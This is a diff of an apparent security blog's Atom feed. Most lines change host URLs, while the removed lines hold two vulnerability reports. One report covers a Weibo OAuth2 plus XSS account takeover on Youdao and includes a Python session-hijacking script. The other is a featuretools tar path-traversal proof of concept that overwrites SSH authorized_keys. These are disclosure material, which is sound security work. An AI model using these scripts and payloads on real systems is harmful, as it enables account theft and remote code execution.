-</code></pre></div></div>]]></content><author><name></name></author><category term="xss" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Remote Code Execution via Arbitrary File Overwrite Using Path Traversal in agent-protocol</title><link href="http://localhost:4000/file-overwrite/2024/04/10/remote-code-executoin-via-afo-using-path-traversal-in-agent-protol.html" rel="alternate" type="text/html" title="Remote Code Execution via Arbitrary File Overwrite Using Path Traversal in agent-protocol" /><published>2024-04-10T10:31:06+08:00</published><updated>2024-04-10T10:31:06+08:00</updated><id>http://localhost:4000/file-overwrite/2024/04/10/remote-code-executoin-via-afo-using-path-traversal-in-agent-protol</id><content type="html" xml:base="http://localhost:4000/file-overwrite/2024/04/10/remote-code-executoin-via-afo-using-path-traversal-in-agent-protol.html"><![CDATA[<h2 id="name">Name</h2>
+</code></pre></div></div>]]></content><author><name></name></author><category term="xss" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Remote Code Execution via Arbitrary File Overwrite Using Path Traversal in agent-protocol</title><link href="http://0.0.0.0:4000/file-overwrite/2024/04/10/remote-code-execution-via-afo-using-path-traversal-in-agent-protol.html" rel="alternate" type="text/html" title="Remote Code Execution via Arbitrary File Overwrite Using Path Traversal in agent-protocol" /><published>2024-04-10T10:31:06+08:00</published><updated>2024-04-10T10:31:06+08:00</updated><id>http://0.0.0.0:4000/file-overwrite/2024/04/10/remote-code-execution-via-afo-using-path-traversal-in-agent-protol</id><content type="html" xml:base="http://0.0.0.0:4000/file-overwrite/2024/04/10/remote-code-execution-via-afo-using-path-traversal-in-agent-protol.html"><![CDATA[<h2 id="name">Name</h2>
 
 <blockquote>
   <p>Remote Code Execution via Arbitrary File Overwrite Using Path Traversal in agent-protocol</p>
@@ -765,7 +1089,7 @@ ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDb+p1vHNh3CdWiOt+1DDptHOL+Rs7/YeRmjALSIqEM
 
 <h2 id="occurrences">Occurrences</h2>
 
-<p><a href="https://github.com/AI-Engineer-Foundation/agent-protocol/blob/52960383f4adca11061bd39358c5933df7eb8b24/packages/sdk/python/agent_protocol/agent.py#L188C49-L188C58">https://github.com/AI-Engineer-Foundation/agent-protocol/blob/52960383f4adca11061bd39358c5933df7eb8b24/packages/sdk/python/agent_protocol/agent.py#L188C49-L188C58</a></p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Remote Code Execution via Arbitrary File Overwrite Using Path Traversal in smol-developer</title><link href="http://localhost:4000/file-overwrite/2024/04/10/remote-code-executoin-via-afo-using-path-traversal-in-smol-developer.html" rel="alternate" type="text/html" title="Remote Code Execution via Arbitrary File Overwrite Using Path Traversal in smol-developer" /><published>2024-04-10T10:31:06+08:00</published><updated>2024-04-10T10:31:06+08:00</updated><id>http://localhost:4000/file-overwrite/2024/04/10/remote-code-executoin-via-afo-using-path-traversal-in-smol-developer</id><content type="html" xml:base="http://localhost:4000/file-overwrite/2024/04/10/remote-code-executoin-via-afo-using-path-traversal-in-smol-developer.html"><![CDATA[<h2 id="name">Name</h2>
+<p><a href="https://github.com/AI-Engineer-Foundation/agent-protocol/blob/52960383f4adca11061bd39358c5933df7eb8b24/packages/sdk/python/agent_protocol/agent.py#L188C49-L188C58">https://github.com/AI-Engineer-Foundation/agent-protocol/blob/52960383f4adca11061bd39358c5933df7eb8b24/packages/sdk/python/agent_protocol/agent.py#L188C49-L188C58</a></p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Remote Code Execution via Arbitrary File Overwrite Using Path Traversal in smol-developer</title><link href="http://0.0.0.0:4000/file-overwrite/2024/04/10/remote-code-execution-via-afo-using-path-traversal-in-smol-developer.html" rel="alternate" type="text/html" title="Remote Code Execution via Arbitrary File Overwrite Using Path Traversal in smol-developer" /><published>2024-04-10T10:31:06+08:00</published><updated>2024-04-10T10:31:06+08:00</updated><id>http://0.0.0.0:4000/file-overwrite/2024/04/10/remote-code-execution-via-afo-using-path-traversal-in-smol-developer</id><content type="html" xml:base="http://0.0.0.0:4000/file-overwrite/2024/04/10/remote-code-execution-via-afo-using-path-traversal-in-smol-developer.html"><![CDATA[<h2 id="name">Name</h2>
 
 <p>TODO：</p>
 
@@ -899,7 +1223,7 @@ ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDb+p1vHNh3CdWiOt+1DDptHOL+Rs7/YeRmjALSIqEM
 
 <h2 id="occurrences">Occurrences</h2>
 
-<p><a href="https://github.com/AI-Engineer-Foundation/agent-protocol/blob/52960383f4adca11061bd39358c5933df7eb8b24/packages/sdk/python/agent_protocol/agent.py#L188C49-L188C58">https://github.com/AI-Engineer-Foundation/agent-protocol/blob/52960383f4adca11061bd39358c5933df7eb8b24/packages/sdk/python/agent_protocol/agent.py#L188C49-L188C58</a></p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">CVE-2024-32005: Local File Inclusion in NiceGUI leaflet component</title><link href="http://localhost:4000/file-overwrite/2024/04/10/local-file-inclusion-in-nicegui.html" rel="alternate" type="text/html" title="CVE-2024-32005: Local File Inclusion in NiceGUI leaflet component" /><published>2024-04-10T10:31:06+08:00</published><updated>2024-04-10T10:31:06+08:00</updated><id>http://localhost:4000/file-overwrite/2024/04/10/local-file-inclusion-in-nicegui</id><content type="html" xml:base="http://localhost:4000/file-overwrite/2024/04/10/local-file-inclusion-in-nicegui.html"><![CDATA[<h2 id="name">Name</h2>
+<p><a href="https://github.com/AI-Engineer-Foundation/agent-protocol/blob/52960383f4adca11061bd39358c5933df7eb8b24/packages/sdk/python/agent_protocol/agent.py#L188C49-L188C58">https://github.com/AI-Engineer-Foundation/agent-protocol/blob/52960383f4adca11061bd39358c5933df7eb8b24/packages/sdk/python/agent_protocol/agent.py#L188C49-L188C58</a></p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">CVE-2024-32005: Local File Inclusion in NiceGUI leaflet component</title><link href="http://0.0.0.0:4000/file-overwrite/2024/04/10/local-file-inclusion-in-nicegui.html" rel="alternate" type="text/html" title="CVE-2024-32005: Local File Inclusion in NiceGUI leaflet component" /><published>2024-04-10T10:31:06+08:00</published><updated>2024-04-10T10:31:06+08:00</updated><id>http://0.0.0.0:4000/file-overwrite/2024/04/10/local-file-inclusion-in-nicegui</id><content type="html" xml:base="http://0.0.0.0:4000/file-overwrite/2024/04/10/local-file-inclusion-in-nicegui.html"><![CDATA[<h2 id="name">Name</h2>
 
 <blockquote>
   <p>NiceGUI: Local File Inclusion in NiceGUI leaflet component</p>
@@ -1041,324 +1365,4 @@ irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
 
 <h2 id="occurrences">Occurrences</h2>
 
-<p><a href="https://github.com/zauberzeug/nicegui/blob/eac5a5faa9fbd8823a6b76784a76fce618fd7afc/nicegui/nicegui.py#L98">https://github.com/zauberzeug/nicegui/blob/eac5a5faa9fbd8823a6b76784a76fce618fd7afc/nicegui/nicegui.py#L98</a></p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">高危：有道智云存在微博OAuth2登录缺陷串联XSS漏洞实现账户劫持(忽略!)</title><link href="http://localhost:4000/account-takeover/2024/04/09/ai-youdao-oauth2-account-takeover.html" rel="alternate" type="text/html" title="高危：有道智云存在微博OAuth2登录缺陷串联XSS漏洞实现账户劫持(忽略!)" /><published>2024-04-09T10:26:18+08:00</published><updated>2024-04-09T10:26:18+08:00</updated><id>http://localhost:4000/account-takeover/2024/04/09/ai-youdao-oauth2-account-takeover</id><content type="html" xml:base="http://localhost:4000/account-takeover/2024/04/09/ai-youdao-oauth2-account-takeover.html"><![CDATA[<h2 id="name">Name</h2>
-
-<blockquote>
-  <p>有道智云存在微博OAuth2登录缺陷, 串联XSS漏洞实现账户劫持(对业务影响小，忽略hh)</p>
-</blockquote>
-
-<h2 id="weakness">Weakness</h2>
-<blockquote>
-  <p>account takeover</p>
-</blockquote>
-
-<h2 id="severity">Severity</h2>
-<blockquote>
-  <p>High, 9.5</p>
-</blockquote>
-
-<h2 id="url">URL</h2>
-<ul>
-  <li>
-    <p>POC网页: <a href="https://api.weibo.com/oauth2/authorize?response_type=code&amp;client_id=1230490736&amp;redirect_uri=https%3A%2F%2Fnote.youdao.com%2Fcoshare%2Findex.html%3Ftoken%3DC47998CE491248EFAE31401AAD4B00BF%26gid%3D149090401%26_time%3D171263020522&amp;forcelogin=true###">https://api.weibo.com/oauth2/authorize?response_type=code&amp;client_id=1230490736&amp;redirect_uri=https%3A%2F%2Fnote.youdao.com%2Fcoshare%2Findex.html%3Ftoken%3DC47998CE491248EFAE31401AAD4B00BF%26gid%3D149090401%26_time%3D171263020522&amp;forcelogin=true###</a></p>
-  </li>
-  <li>
-    <p>视频链接：<a href="https://pan.baidu.com/s/150gjIgO-9ywmzt5bD92tEw">https://pan.baidu.com/s/150gjIgO-9ywmzt5bD92tEw</a> 提取码：1314</p>
-  </li>
-</ul>
-
-<h2 id="key-payload">Key Payload</h2>
-
-<p>OAuth2登录请求，其中code参数是攻击者截获的微博认证code：</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /login-weibo-redirect.s?code=58590295c78da0b3f1141b7bdcb5bc4f HTTP/1.1
-Host: ai.youdao.com
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
-Connection: close
-Referer: https://api.weibo.com/
-Cookie: JSESSIONID_NEW=5f715da6-a7c5-4638-8401-4a7e64330d93
-Upgrade-Insecure-Requests: 1
-Sec-Fetch-Dest: document
-Sec-Fetch-Mode: navigate
-Sec-Fetch-Site: cross-site
-</code></pre></div></div>
-
-<h2 id="summary">Summary</h2>
-
-<p>网易有道智云平台的登录有几种认证方式，其中之一是微博的OAuth2登录：</p>
-
-<ol>
-  <li>用户选择微博登录后，会跳转到微博的登录认证界面，并要求用户扫码登录。但是该OAuth2没有state参数，仅有redirect参数，并且该参数的跳转链接为在任何youdao.com域名的链接。</li>
-  <li>当攻击者在youdao.com域名下找到xss漏洞后，攻击者能够设置redirect参数为xss漏洞页面，微博将code追加到xss链接之后，让攻击者通过xss读取该链接即可获取weibo token。</li>
-  <li>攻击者获取code后，通过code能够获取认证服务器返回的JSESSIONID_NEW cookie。通过该cookie能够登录受害者账户，实现账户劫持。</li>
-</ol>
-
-<h4 id="trigger">Trigger</h4>
-<ol>
-  <li>
-    <p>首先利用先前找到的有道云协作markdown渲染XSS漏洞，该漏洞是markdown在渲染classDiagram类图时，未对node名称进行过滤，从而触发xss漏洞。并且markdown可以分享，例如分享xss链接为：<a href="https://note.youdao.com/coshare/index.html?token=C47998CE491248EFAE31401AAD4B00BF&amp;gid=149090401&amp;_time=1712630205225">https://note.youdao.com/coshare/index.html?token=C47998CE491248EFAE31401AAD4B00BF&amp;gid=149090401&amp;_time=1712630205225</a></p>
-
-    <p><img src="/assets/youdaoai/xiezuo.png" alt="xiezuo" /></p>
-
-    <p><img src="/assets/youdaoai/xiezuoxss.png" alt="xiezuoxss" /></p>
-  </li>
-  <li>
-    <p>受害者：注册网易有道智云平台账号，<a href="https://ai.youdao.com/login.s">https://ai.youdao.com/login.s</a>。并且进入账号设置，绑定微博账号。</p>
-
-    <p>登录和注册：</p>
-
-    <p><img src="/assets/youdaoai/register.png" alt="reg" /></p>
-
-    <p>微博绑定：</p>
-
-    <p><img src="/assets/youdaoai/weibo.png" alt="weibo" /></p>
-  </li>
-  <li>
-    <p>攻击者：打开通过微博登录链接，跳转到微博OAuth2验证界面，该界面提供二维码，用户通过微博app扫描即可登录。我们分析一下该验证界面的链接。</p>
-
-    <p>微博登录入口：</p>
-
-    <p><img src="/assets/youdaoai/weibodenglu.png" alt="weibod" /></p>
-
-    <p>微博扫码登录界面：</p>
-
-    <p><img src="/assets/youdaoai/weiboauth.png" alt="weiboa" /></p>
-
-    <p>分析微博验证界面的url链接：</p>
-
-    <p>https://api.weibo.com/oauth2/authorize?response_type=code&amp;client_id=1230490736&amp;redirect_uri=https%3A%2F%2Fai.youdao.com%2Flogin-weibo-redirect.s&amp;forcelogin=true###</p>
-
-    <p>可以看到OAuth2的返回token是<code class="language-plaintext highlighter-rouge">code</code>类型，<code class="language-plaintext highlighter-rouge">redirect_uri</code>指向<code class="language-plaintext highlighter-rouge">https://ai.youdao.com/login-weibo-redirect.s</code>，未提供<code class="language-plaintext highlighter-rouge">state</code>参数，说明验证仅仅依靠code和跳转链接。只需要将跳转链接设置为攻击者控制的链接，就能够获取验证token。</p>
-  </li>
-  <li>
-    <p>笔者测试发现，redirect_uri仅仅验证了是否为youdao.com域名，子域名、路径等等都未验证，由此，攻击者只需要将该跳转链接设置为包含xss漏洞的链接即可截获token。</p>
-
-    <p>youdao.com域名下的xss漏洞链接：</p>
-
-    <p>https://note.youdao.com/coshare/index.html?token=C47998CE491248EFAE31401AAD4B00BF&amp;gid=149090401&amp;_time=1712630205225</p>
-
-    <p>将上述链接urlencode后替换redirect_uri值：</p>
-
-    <p>https://api.weibo.com/oauth2/authorize?response_type=code&amp;client_id=1230490736&amp;redirect_uri=https%3A%2F%2Fnote.youdao.com%2Fcoshare%2Findex.html%3Ftoken%3DC47998CE491248EFAE31401AAD4B00BF%26gid%3D149090401%26_time%3D171263020522&amp;forcelogin=true###</p>
-
-    <p>打开上述链接，并且将二维码发送给受害者，让其用微博扫描后：</p>
-
-    <p><img src="/assets/youdaoai/redirect.png" alt="re" /></p>
-
-    <p>跳转到攻击者控制的XSS页面，该xxs将发送code到远程服务器：</p>
-
-    <p><img src="/assets/youdaoai/weibotoken.png" alt="xss" /></p>
-
-    <p><img src="/assets/youdaoai/webhook2.png" alt="webhook" /></p>
-  </li>
-  <li>
-    <p>攻击者获取微博token后，分以下几个步骤获取受害者的session cookie,和jwt token:</p>
-
-    <p>第一步：将code发送后台服务器，get url为：https://ai.youdao.com/login-weibo-redirect.s?code=xxx ，服务器验证code合法后返回 <code class="language-plaintext highlighter-rouge">JSESSIONID_NEW</code> cookie作为session cookie。</p>
-
-    <p><img src="/assets/youdaoai/sessioncookie.png" alt="sess" /></p>
-
-    <p>第二步：将第一步的cookie设置到后续请求中，然后调用微博登录接口：post url为：https://ai.youdao.com/login-weibo.s</p>
-
-    <p><img src="/assets/youdaoai/loginweibo.png" alt="login" /></p>
-
-    <p>第三步：调用get url请求：https://ai.youdao.com/consoleApi/ABTest/checkUser ，获取jwt token。</p>
-
-    <p><img src="/assets/youdaoai/getjwt.png" alt="getjwt" /></p>
-
-    <p>第四步：获取受害者账户信息，调用post url请求：https://ai.youdao.com/consoleApi/user/getUserInfo ,成功返回信息。</p>
-
-    <p><img src="/assets/youdaoai/getuserinfo.png" alt="getuser" /></p>
-  </li>
-  <li>
-    <p>为自动化上述过程，笔者提供自动化脚本供测试：</p>
-
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> import requests
- import sys
-
- weiboCode= "weibo_code"
- # 1. login-weibo-redirect.s
- url = "https://ai.youdao.com/login-weibo-redirect.s?code="
- payload = {}
- headers = {
- 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
- 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0',
- 'Cookie':'f1194a72-cdcc-48ca-86bb-5d33f3ff667e'
- }
- response = requests.request("GET", url + weiboCode, headers=headers, data=payload)
- cookies = response.headers['Set-Cookie']
-
- JSESSIONID_NEW = None
- if cookies:
-     cookie_strings = cookies.split(';')
-     for cookie_string in cookie_strings:
-         cookie_parts = cookie_string.strip().split('=')
-         if len(cookie_parts) == 2 and cookie_parts[0] == 'JSESSIONID_NEW':
-             JSESSIONID_NEW = cookie_parts[1]
-             print("Cookie Value:", JSESSIONID_NEW)
-             break
-
- if not JSESSIONID_NEW:
-     print("no JSESSIONID_NEW found")
-     sys.exit()
-
- print("################get JSESSIONID_NEW###############")
- print(JSESSIONID_NEW)
-
-
- # 2. login-weibo.s 
- url = "https://ai.youdao.com/login-weibo.s"
-
- payload = {}
- headers = {
- 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
- 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0',
- 'Cookie':'JSESSIONID_NEW='+JSESSIONID_NEW+'; csrfToken=e9f3e7f6',
- 'Origin': 'https://ai.youdao.com',
- 'Sec-Fetch-Site': 'same-origin'
- }
- response = requests.request("POST", url, headers=headers, data=payload)
-
- # /consoleApi/ABTest/checkUser
- url = "https://ai.youdao.com/consoleApi/ABTest/checkUser"
- payload = {}
- response = requests.request("GET", url, headers=headers, data=payload)
- Authorization = response.headers['Authorization']
- print("################Authorization###############")
- print(Authorization)
-
- # /consoleApi/user/getUserInfo
- url = "https://ai.youdao.com/consoleApi/user/getUserInfo"
- payload = {}
- response = requests.request("POST", url, headers=headers, data=payload)
- print("################getUserInfo###############")
- print(response.text)
-</code></pre></div>    </div>
-  </li>
-</ol>
-
-<h3 id="proof">Proof</h3>
-<p>请提供截图或视频</p>
-
-<p>链接：<a href="https://pan.baidu.com/s/150gjIgO-9ywmzt5bD92tEw">https://pan.baidu.com/s/150gjIgO-9ywmzt5bD92tEw</a>
-提取码：1314</p>
-
-<h2 id="impact">Impact</h2>
-
-<p>该漏洞影响所有绑定了微博账户的有道智云用户，只要受害者用微博扫描攻击者发送的二维码，即可实现有道智云账户的劫持攻击。</p>
-
-<h2 id="patch-advice">Patch advice</h2>
-
-<ol>
-  <li>对微博OAuth2设置state参数，并且限定redirect url。</li>
-</ol>]]></content><author><name></name></author><category term="account-takeover" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Huntr: Arbitrary File Overwrite in read_entityset api</title><link href="http://localhost:4000/file-overwrite/2024/04/07/arbitrary-file-overwrite-in-featuretools.html" rel="alternate" type="text/html" title="Huntr: Arbitrary File Overwrite in read_entityset api" /><published>2024-04-07T10:31:06+08:00</published><updated>2024-04-07T10:31:06+08:00</updated><id>http://localhost:4000/file-overwrite/2024/04/07/arbitrary-file-overwrite-in-featuretools</id><content type="html" xml:base="http://localhost:4000/file-overwrite/2024/04/07/arbitrary-file-overwrite-in-featuretools.html"><![CDATA[<h2 id="name">Name</h2>
-
-<blockquote>
-  <p>Huntr: Arbitrary File Overwrite in read_entityset api in featuretools</p>
-</blockquote>
-
-<h2 id="weakness">Weakness</h2>
-
-<blockquote>
-  <p>CWE-22: Path Traversal</p>
-</blockquote>
-
-<h2 id="severity">Severity</h2>
-
-<blockquote>
-  <p>High (8.8)</p>
-</blockquote>
-
-<h2 id="description">Description</h2>
-
-<p>The <a href="https://featuretools.alteryx.com/en/stable/generated/featuretools.read_entityset.html#featuretools.read_entityset">featuretools.read_entityset</a> function does not adequately prevent malicious tar files from performing path traversal attacks. This can allow the downloading of malicious tar files that can overwrite any file. This leads directly to a high impact regarding the integrity of files. An attacker could also abuse this to impact the availability, by deleting system files, personal files, or application files. Remote code execution is also possible through various means.</p>
-
-<p>The vulnerable function is exposed through the <code class="language-plaintext highlighter-rouge">featuretools.read_entityset</code> function, which can be imported easily. It’s an api used to read data_description.json from directory on disk, S3 path, or URL which is tar file.</p>
-
-<p>This code snippet shows how the <code class="language-plaintext highlighter-rouge">read_entityset</code> function extracts a tar file downloaded from internet without performing any security checks.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def read_entityset(path, profile_name=None, **kwargs):
-    """Read entityset from disk, S3 path, or URL.
-
-    Args:
-        path (str): Directory on disk, S3 path, or URL to read `data_description.json`.
-        profile_name (str, bool): The AWS profile specified to write to S3. Will default to None and search for AWS credentials.
-            Set to False to use an anonymous profile.
-        kwargs (keywords): Additional keyword arguments to pass as keyword arguments to the underlying deserialization method.
-    """
-    if _is_url(path) or _is_s3(path) or _is_local_tar(str(path)):
-        with tempfile.TemporaryDirectory() as tmpdir:
-            local_path = path
-            transport_params = None
-
-            if _is_s3(path):
-                transport_params = get_transport_params(profile_name)
-
-            if _is_s3(path) or _is_url(path):
-                local_path = os.path.join(tmpdir, "temporary_es")
-                use_smartopen_es(local_path, path, transport_params) # download file from url!
-            ### tar file extracted to tepdir without any security checks ###
-            with tarfile.open(str(local_path)) as tar:
-                tar.extractall(path=tmpdir)
-
-            data_description = read_data_description(tmpdir)
-            return description_to_entityset(data_description, **kwargs)
-    else:
-        data_description = read_data_description(path)
-        return description_to_entityset(data_description, **kwargs)
-</code></pre></div></div>
-
-<p>The Python documentation explains us that tarfiles may have absolute filenames starting with / which could overwite files in system.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Warning: Never extract archives from untrusted sources without prior inspection. 
-It is possible that files are created outside of path, 
-e.g. members that have absolute filenames starting with "/" or filenames with two dots "..".
-</code></pre></div></div>
-
-<h2 id="proof-of-concept">Proof of Concept</h2>
-
-<p>An attacker can create a malicous tar file using following command:</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tar --absolute-names -cvf hack.tar /home/kali/.ssh/authorized_keys
-</code></pre></div></div>
-
-<p>Then, the attacker will upload the <code class="language-plaintext highlighter-rouge">hack.tar</code> to public server.</p>
-
-<p>I have uploaded one malicous tar file for testing: <a href="https://raw.githubusercontent.com/sunriseXu/onnx/main/validated/hack.tar">https://raw.githubusercontent.com/sunriseXu/onnx/main/validated/hack.tar</a></p>
-
-<p>If anyone now downloads tar using <code class="language-plaintext highlighter-rouge">read_entityset</code> api, causing automatically extracting the malicous tar file and overwrite files silently.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import featuretools as ft
-ft.read_entityset(path="https://raw.githubusercontent.com/sunriseXu/onnx/main/validated/hack.tar")
-</code></pre></div></div>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cat /home/kali/.ssh/authorized_keys
-ssh-rsa xxx hacker@test.com
-</code></pre></div></div>
-
-<p>Tested on Google Colab: <a href="https://colab.research.google.com/drive/1qc7qg_VPPHKVOUT-xhSygg2M7mwDdVTt?usp=sharing">https://colab.research.google.com/drive/1qc7qg_VPPHKVOUT-xhSygg2M7mwDdVTt?usp=sharing</a></p>
-
-<p><img src="https://live.staticflickr.com/65535/53637853744_26b8a5fff7_h.jpg" alt="poc" /></p>
-
-<h2 id="impact">Impact</h2>
-
-<p>This vulnerability can have severe consequences. This section will highlight some tangible impact.</p>
-
-<h3 id="ssh-access">SSH Access</h3>
-
-<p>On servers that have SSH enabled, an attacker may be able to inject their own public RSA key into the authorized_keys file, leading to remote code execution.</p>
-
-<h3 id="web-servers">Web Servers</h3>
-
-<p>On servers hosting web servers, various vulnerabilities can be exploited. On PHP or JSP server, remote code execution may be possible via uploading a webshell. On other servers an HTML file can be uploaded to achieve Cross-site Scripting (XSS)</p>
-
-<h2 id="reference">Reference</h2>
-
-<p><a href="https://huntr.com/bounties/5d7e5752-085c-4e93-af0d-e25f05a27b89">https://huntr.com/bounties/5d7e5752-085c-4e93-af0d-e25f05a27b89</a></p>
-
-<h2 id="occurrences">Occurrences</h2>
-
-<p><a href="https://github.com/alteryx/featuretools/blob/21d0bf0915238ba6c6bc1e958b9a91b209f88de5/featuretools/entityset/deserialize.py#L170">https://github.com/alteryx/featuretools/blob/21d0bf0915238ba6c6bc1e958b9a91b209f88de5/featuretools/entityset/deserialize.py#L170</a></p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry></feed>
+<p><a href="https://github.com/zauberzeug/nicegui/blob/eac5a5faa9fbd8823a6b76784a76fce618fd7afc/nicegui/nicegui.py#L98">https://github.com/zauberzeug/nicegui/blob/eac5a5faa9fbd8823a6b76784a76fce618fd7afc/nicegui/nicegui.py#L98</a></p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry></feed>
